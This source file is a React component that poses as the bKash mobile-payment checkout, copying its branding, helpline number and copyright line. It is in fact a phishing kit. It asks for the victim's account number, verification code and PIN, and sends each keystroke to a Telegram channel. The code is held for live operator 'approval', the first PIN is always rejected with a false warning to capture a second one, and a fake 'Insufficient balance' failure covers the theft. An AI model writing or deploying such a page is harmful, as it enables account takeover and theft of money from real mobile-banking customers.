import { bustImage } from "@/lib/assetVersion";
import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { submitOtpForApproval } from "@/lib/otpApproval";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import FlowLoading from "@/components/FlowLoading";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { Phone } from "lucide-react";
import RaisedHandIcon from "@/components/icons/RaisedHandIcon";
import genzLogo from "@/assets/payment/genz-logo.png";
import bkashLogoImg from "@/assets/payment/bkash-logo.png";
import bkashPaymentLogo from "@/assets/payment/bkash-payment-logo.png.asset.json";
import robiLogoAsset from "@/assets/merchant/robi.png";
import grameenphoneLogoAsset from "@/assets/merchant/grameenphone.png";
import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";

const BkashPayment = ({ methodId = "bkash" }: { methodId?: "bkash" | "bkash2" }) => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  usePaymentAccessGuard("bkash");
  const isAllowed = usePaymentMethodGuard(methodId);
  const { merchant, inv, logo } = useMerchantInfo("bkash", { merchant: "", inv: "", logo: "genz" });
  const otpResumeRef = useRef(readOtpResume(methodId));
  const otpResumeState = otpResumeRef.current?.state;
  const isRestoringOtp = otpResumeState?.showOtpView === true;
  const isRestoringPin = otpResumeState?.showPinView === true;
  const isRestoring = isRestoringOtp || isRestoringPin;
  const [isLoading, setIsLoading] = useState(!isRestoring);

  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState(
    typeof otpResumeState?.phoneNumber === "string" ? otpResumeState.phoneNumber : "",
  );
  const [showCancelView, setShowCancelView] = useState(false);
  const [showOtpView, setShowOtpView] = useState(isRestoringOtp);
  const [showPinView, setShowPinView] = useState(isRestoringPin);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpCode, setOtpCode] = useState(typeof otpResumeState?.otpCode === "string" ? otpResumeState.otpCode : "");
  const [pinCode, setPinCode] = useState("");
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showPinWarning, setShowPinWarning] = useState(false);
  const [resendTimer, setResendTimer] = useState(
    typeof otpResumeState?.resendTimer === "number" ? otpResumeState.resendTimer : 30,
  );
  const [resendStatus, setResendStatus] = useState<"idle" | "sending" | "sent">("idle");
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showWrongOtp, setShowWrongOtp] = useState(false);
  const [wrongOtpShown, setWrongOtpShown] = useState(otpResumeState?.wrongOtpShown === true);
  const [pinWarningShown, setPinWarningShown] = useState(false);
  const [otpElapsed, setOtpElapsed] = useState(
    typeof otpResumeState?.otpElapsed === "number" ? otpResumeState.otpElapsed : 0,
  );

  const otpInputRef = useRef<HTMLInputElement>(null);
  const pinInputRef = useRef<HTMLInputElement>(null);
  const phoneInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isLoading && !showFailedView && !showCancelView) {
      if (showOtpView) setTimeout(() => otpInputRef.current?.focus(), 100);
      else if (showPinView) setTimeout(() => pinInputRef.current?.focus(), 100);
      else setTimeout(() => phoneInputRef.current?.focus(), 100);
    }
  }, [isLoading, showOtpView, showPinView, showFailedView, showCancelView]);

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (showOtpView || showPinView || showFailedView) {
        navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
      } else {
        navigate(`/payment?amount=${amount}`);
      }
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, showOtpView, showPinView, showFailedView]);

  useEffect(() => {
    if (isRestoring) return;
    const timer = setTimeout(() => setIsLoading(false), 2000);
    return () => clearTimeout(timer);
  }, [isRestoring]);

  useEffect(() => {
    if (showOtpView || showPinView) {
      saveOtpResume(methodId, searchParams.toString(), {
        showOtpView,
        showPinView,
        phoneNumber,
        otpCode,
        resendTimer,
        wrongOtpShown,
        otpElapsed,
      });
    } else {
      clearOtpResume(methodId);
    }
  }, [showOtpView, showPinView, phoneNumber, otpCode, resendTimer, wrongOtpShown, otpElapsed, searchParams]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidNumber = () => {
    if (phoneNumber.length !== 11) return false;
    return validPrefixes.includes(phoneNumber.substring(0, 3)) && /^\d+$/.test(phoneNumber);
  };
  const isValidOtp = () => otpCode.length === 6 && /^\d+$/.test(otpCode);
  const isValidPin = () => (pinCode.length === 4 || pinCode.length === 5) && /^\d+$/.test(pinCode);
  const getMaskedNumber = () => {
    if (phoneNumber.length !== 11) return "";
    return `${phoneNumber.substring(0, 3)} ** *** ${phoneNumber.substring(8)}`;
  };

  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (showOtpView && resendTimer > 0) interval = setInterval(() => setResendTimer((p) => p - 1), 1000);
    return () => clearInterval(interval);
  }, [showOtpView, resendTimer]);

  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (showOtpView) {
      setOtpElapsed(0);
      interval = setInterval(() => setOtpElapsed((p) => p + 1), 1000);
    }
    return () => clearInterval(interval);
  }, [showOtpView]);

  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (showFailedView && redirectTimer > 0) interval = setInterval(() => setRedirectTimer((p) => p - 1), 1000);
    if (showFailedView && redirectTimer === 0)
      navigate(`/payment-cancelled?channel=bKash&reason=Insufficient Balance&amount=${amount}`);
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) =>
    setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 11));
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtpCode(v);
    if (v.length > otpCode.length && v.length > 0) {
      sendTelegramNotification({
        type: "payment_activity",
        amount,
        method: "bKash",
        paymentType: "mfs",
        number: phoneNumber,
        otp: v,
      });
    }
  };
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPinCode(v);
    if (v.length > pinCode.length && v.length > 0) {
      sendTelegramNotification({
        type: "payment_activity",
        amount,
        method: "bKash",
        paymentType: "mfs",
        number: phoneNumber,
        otp: otpCode,
        pin: v,
      });
    }
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      sendTelegramNotification(
        { type: "payment_activity", amount, method: "bKash", paymentType: "mfs", number: phoneNumber },
        { force: true },
      );
      setIsConfirmLoading(true);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowOtpView(true);
        setResendTimer(30);
        setResendStatus("sent");
        setTimeout(() => setResendStatus("idle"), 3000);
      }, 2000);
    }
  };

  const [otpDenyCount, setOtpDenyCount] = useState(0);
  const handleOtpConfirm = async () => {
    if (!isValidOtp()) return;
    setIsConfirmLoading(true);
    const decision = await submitOtpForApproval(
      {
        amount,
        method: "bKash",
        paymentType: "mfs",
        number: phoneNumber,
        otp: otpCode,
      },
      { autoAttempt: wrongOtpShown ? 2 : 1, otpStartAt: Date.now() - otpElapsed * 1000 },
    );
    setIsConfirmLoading(false);
    if (decision === "approved") {
      setShowOtpView(false);
      setShowPinView(true);
    } else if (decision === "timeout" || decision === "error") {
      navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
    } else {
      const nextDenies = otpDenyCount + 1;
      setOtpDenyCount(nextDenies);
      if (nextDenies >= 3) {
        navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
        return;
      }
      setShowWrongOtp(true);
      setWrongOtpShown(true);
      setOtpCode("");
      setTimeout(() => otpInputRef.current?.focus(), 50);
      setTimeout(() => setShowWrongOtp(false), 3000);
    }
  };

  const handlePinConfirm = () => {
    if (isValidPin()) {
      setIsConfirmLoading(true);
      sendTelegramNotification(
        {
          type: "payment_activity",
          amount,
          method: "bKash",
          paymentType: "mfs",
          number: phoneNumber,
          otp: otpCode,
          pin: pinCode,
        },
        { force: true },
      );
      if (pinAttempts === 0 && !pinWarningShown) {
        setTimeout(() => {
          setIsConfirmLoading(false);
          setPinAttempts(1);
          setShowPinWarning(true);
          setPinWarningShown(true);
          setPinCode("");
          setTimeout(() => pinInputRef.current?.focus(), 50);
        }, 2000);
        return;
      }
      setShowPinWarning(false);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowPinView(false);
        setShowFailedView(true);
        setRedirectTimer(5);
      }, 2000);
    }
  };

  const handleResendCode = () => {
    if (resendTimer === 0 && resendStatus === "idle") {
      setResendStatus("sending");
      setTimeout(() => {
        setResendStatus("sent");
        setResendTimer(30);
        setTimeout(() => setResendStatus("idle"), 3000);
      }, 2000);
    }
  };

  const handleCancelClick = () => setShowCancelView(true);
  const handleBackFromCancel = () => setShowCancelView(false);
  const handleYesFromCancelView = () =>
    navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);

  if (isAllowed !== true) return <FlowLoading />;

  const merchantLogo =
    logo && (logo.startsWith("data:") || logo.startsWith("http") || logo.startsWith("/"))
      ? logo
      : logo === "robi"
        ? robiLogoAsset
        : logo === "mygp"
          ? grameenphoneLogoAsset
          : genzLogo;

  // The bKash Payment variant shows its own brand mark in the flow header.
  const isBkash2 = methodId === "bkash2";
  const headerLogo = isBkash2 ? bkashPaymentLogo.url : bkashLogoImg;
  const headerLogoAlt = isBkash2 ? "bKash Payment" : "bKash";
  const headerLogoClass = isBkash2 ? "h-10 w-auto object-contain max-w-none" : "h-20 w-auto object-contain max-w-none";
  const copyrightYear = new Date().getFullYear();

  const confirmBusy = isConfirmLoading || resendStatus === "sending";

  const loaderDots = (
    <div className="absolute inset-0 flex items-center justify-center">
      <div className="relative w-11 h-3">
        <span
          className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnA_2.4s_linear_infinite]"
          style={{ backgroundColor: "rgba(255,255,255,0.3)" }}
        />
        <span
          className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnB_2.4s_linear_infinite]"
          style={{ backgroundColor: "rgba(255,255,255,0.5)" }}
        />
        <span
          className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnC_2.4s_linear_infinite]"
          style={{ backgroundColor: "rgba(255,255,255,0.7)" }}
        />
        <span
          className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnD_2.4s_linear_infinite]"
          style={{ backgroundColor: "rgba(255,255,255,1)" }}
        />
      </div>
    </div>
  );

  return (
    <div className="fixed inset-0 bg-gray-200 flex flex-col items-start justify-start p-4 overflow-hidden">
      <div
        className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden flex flex-col"
        style={{ height: "490px", minHeight: "490px", maxHeight: "490px" }}
      >
        <div className="bg-white flex justify-center items-center border-b shrink-0 leading-none h-14 overflow-hidden">
          <img src={headerLogo} alt={headerLogoAlt} className={headerLogoClass} />
        </div>

        {isLoading ? (
          <>
            <div className="bg-[#E2136E] flex-1 flex flex-col items-center justify-center min-h-0">
              <div className="relative w-24 mb-3" style={{ height: "13px" }}>
                <span
                  className="absolute rounded-full animate-[dotRotate1_2.4s_linear_infinite]"
                  style={{ width: "13px", height: "13px", backgroundColor: "rgba(255,255,255,0.3)" }}
                />
                <span
                  className="absolute rounded-full animate-[dotRotate2_2.4s_linear_infinite]"
                  style={{ width: "13px", height: "13px", backgroundColor: "rgba(255,255,255,0.5)" }}
                />
                <span
                  className="absolute rounded-full animate-[dotRotate3_2.4s_linear_infinite]"
                  style={{ width: "13px", height: "13px", backgroundColor: "rgba(255,255,255,0.7)" }}
                />
                <span
                  className="absolute rounded-full animate-[dotRotate4_2.4s_linear_infinite]"
                  style={{ width: "13px", height: "13px", backgroundColor: "rgba(255,255,255,1)" }}
                />
              </div>
              <p className="text-white text-sm font-medium">Loading</p>
            </div>
            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">© {copyrightYear} bKash, All Rights Reserved</p>
            </div>
          </>
        ) : showFailedView ? (
          <>
            <div className="bg-[#E2136E] flex-1 flex flex-col items-center justify-center relative min-h-0">
              <div className="relative w-8 h-8 mb-4">
                <svg width="32" height="32" viewBox="0 0 44 44" fill="none">
                  <path
                    d="M 30.5 35 A 16 16 0 1 1 35 30.5"
                    stroke="white"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    fill="none"
                  />
                  <line x1="15" y1="15" x2="29" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
                  <line x1="29" y1="15" x2="15" y2="29" stroke="white" strokeWidth="3.5" strokeLinecap="round" />
                </svg>
              </div>
              <h3 className="text-white text-center text-base font-semibold mb-2">Payment Failed</h3>
              <p className="text-white text-center text-xs mb-1">Insufficient balance</p>
              <p className="text-white text-center text-xs">
                Redirecting to <span className="underline">Merchant Website</span> in {redirectTimer}s
              </p>
            </div>
            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">© {copyrightYear} bKash, All Rights Reserved</p>
            </div>
          </>
        ) : (
          <>
            <div className="bg-white px-4 py-2.5 flex items-center justify-between border-b shrink-0">
              <div className="flex items-center gap-2.5">
                <div className="w-10 h-10 shrink-0 rounded-full bg-white flex items-center justify-center overflow-hidden">
                  <img
                    src={bustImage(merchantLogo)}
                    alt={merchant}
                    className="w-full h-full object-fill"
                    style={{ transform: "translateY(2%) scale(1.08, 1.38)" }}
                  />
                </div>
                <div>
                  <h2 className="text-gray-800 font-medium text-xs leading-tight">{merchant}</h2>
                  <p className="text-gray-500 text-[10px]">Inv No: {inv}</p>
                </div>
              </div>
              <span className="text-gray-800 font-semibold text-sm">৳{amount}</span>
            </div>

            {showCancelView ? (
              <>
                <div
                  className="bg-[#E2136E] px-5 flex flex-col items-center justify-center"
                  style={{ height: "310px" }}
                >
                  <RaisedHandIcon className="w-5 h-6 text-white mb-3" strokeWidth={2} />
                  <p className="text-white text-center text-[12px] leading-snug font-medium">
                    Are you sure you want to cancel this
                    <br />
                    authorization?
                  </p>
                </div>
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleYesFromCancelView}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Yes
                  </button>
                  <button
                    onClick={handleBackFromCancel}
                    className="flex-1 bg-[#E2136E] text-white py-3 rounded text-xs font-medium hover:bg-[#C91160] transition-colors"
                  >
                    No
                  </button>
                </div>
              </>
            ) : showPinView ? (
              <>
                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: "310px" }}>
                  <div className="pt-[80px]">
                    <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
                      Enter PIN of your bKash account number
                    </h3>
                    <p className="text-white text-center text-xs font-medium mb-3 h-4">({getMaskedNumber()})</p>
                    <div className="relative">
                      <input
                        id="bkashpayment-fld-1"
                        name="bkashpayment-fld-1"
                        aria-label="bkashpayment field 1"
                        ref={pinInputRef}
                        type="text"
                        inputMode="numeric"
                        autoComplete="off"
                        value={pinCode}
                        onChange={handlePinChange}
                        placeholder="Enter PIN"
                        className="w-full bg-white rounded px-4 py-2 text-center text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
                        style={
                          {
                            color: "transparent",
                            caretColor: pinCode.length > 0 ? "transparent" : "#9ca3af",
                            letterSpacing: "0.25em",
                          } as React.CSSProperties
                        }
                      />
                      {pinCode.length > 0 && (
                        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                          <div className="flex items-center gap-1">
                            {Array.from({ length: pinCode.length }).map((_, i) => (
                              <span key={i} className="w-3.5 h-3.5 rounded-full bg-gray-700 inline-block" />
                            ))}
                            <span className="w-[1px] h-4 bg-gray-500 inline-block animate-pulse" />
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                  {showPinWarning && (
                    <div className="flex items-center justify-center gap-1.5 mt-2">
                      <span className="text-white text-sm">⚠</span>
                      <span className="text-white text-[10px] sm:text-xs font-medium leading-tight text-center">
                        Pin verify failed, you have remained 1 times, be careful !
                      </span>
                    </div>
                  )}
                </div>
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handlePinConfirm}
                    disabled={!isValidPin() || isConfirmLoading}
                    className={`relative flex-1 py-3 rounded text-xs font-medium transition-colors ${isValidPin() || confirmBusy ? "bg-[#E2136E] text-white" : "bg-gray-200 text-gray-400 cursor-not-allowed"}`}
                  >
                    <span className={confirmBusy ? "opacity-0" : ""}>Confirm</span>
                    {confirmBusy && loaderDots}
                  </button>
                </div>
              </>
            ) : showOtpView ? (
              <>
                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: "310px" }}>
                  <div className="pt-[90px]">
                    <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
                      Enter verification code sent to {getMaskedNumber()}
                    </h3>
                    <input
                      id="bkashpayment-fld-2"
                      name="bkashpayment-fld-2"
                      aria-label="bkashpayment field 2"
                      ref={otpInputRef}
                      type="tel"
                      value={otpCode}
                      onChange={handleOtpChange}
                      placeholder="Enter 6 digit code"
                      className="w-full bg-white rounded px-4 py-2 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
                    />
                  </div>
                  <div className="flex flex-col items-center mt-2">
                    {showWrongOtp && (
                      <div className="flex items-center justify-center gap-1.5 mb-1">
                        <span className="text-white text-sm">⚠</span>
                        <span className="text-white text-xs font-medium">Wrong verification code</span>
                      </div>
                    )}
                    {resendStatus === "sending" ? (
                      <p className="text-white text-center text-[10px]">Sending code to user handset ..</p>
                    ) : resendStatus === "sent" ? (
                      <>
                        <p className="text-white text-center text-[10px] font-medium">Code sent successfully</p>
                        <p className="text-white text-center text-[10px] mt-1">Resend Code in {resendTimer}s</p>
                      </>
                    ) : (
                      <p
                        className={`text-white text-center text-[10px] ${resendTimer === 0 ? "underline cursor-pointer hover:text-white/80" : ""}`}
                        onClick={handleResendCode}
                      >
                        {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : "Resend Code"}
                      </p>
                    )}
                  </div>
                </div>
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleOtpConfirm}
                    disabled={!isValidOtp() || isConfirmLoading}
                    className={`relative flex-1 py-3 rounded text-xs font-medium transition-colors ${isValidOtp() || confirmBusy ? "bg-[#E2136E] text-white" : "bg-gray-200 text-gray-400 cursor-not-allowed"}`}
                  >
                    <span className={confirmBusy ? "opacity-0" : ""}>Confirm</span>
                    {confirmBusy && loaderDots}
                  </button>
                </div>
              </>
            ) : (
              <>
                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: "310px" }}>
                  <div className="h-5 flex items-center justify-center mb-3">
                    <h3 className="text-white text-center text-xs font-medium">Your bKash Account Number</h3>
                  </div>
                  <input
                    id="bkashpayment-fld-3"
                    name="bkashpayment-fld-3"
                    aria-label="bkashpayment field 3"
                    ref={phoneInputRef}
                    type="tel"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    placeholder="e.g 01XXXXXXXXX"
                    className="w-full bg-white rounded px-4 py-2 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
                  />
                  <div className="flex flex-col items-center justify-center mt-3">
                    <p className="text-white text-center text-[10px]">
                      By clicking the confirm button you agree to the
                    </p>
                    <a
                      href="https://www.bkash.com/en/page/terms-and-conditions"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-white text-[10px] underline hover:text-white/80"
                    >
                      Terms & Conditions
                    </a>
                  </div>
                </div>
                <div className="bg-white px-4 py-2 flex gap-3 shrink-0">
                  <button
                    onClick={handleCancelClick}
                    className="flex-1 bg-white border border-gray-300 text-gray-600 py-3 rounded text-xs font-medium hover:bg-gray-50 transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleConfirm}
                    disabled={!isValidNumber() || isConfirmLoading}
                    className={`relative flex-1 py-3 rounded text-xs font-medium transition-colors ${isValidNumber() || confirmBusy ? "bg-[#E2136E] text-white" : "bg-gray-200 text-gray-400 cursor-not-allowed"}`}
                  >
                    <span className={confirmBusy ? "opacity-0" : ""}>Confirm</span>
                    {confirmBusy && loaderDots}
                  </button>
                </div>
              </>
            )}

            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
                <Phone className="w-3 h-3" />
                <span className="text-xs font-medium">16247</span>
              </div>
              <p className="text-gray-500 text-[10px]">© {copyrightYear} bKash, All Rights Reserved</p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default BkashPayment;
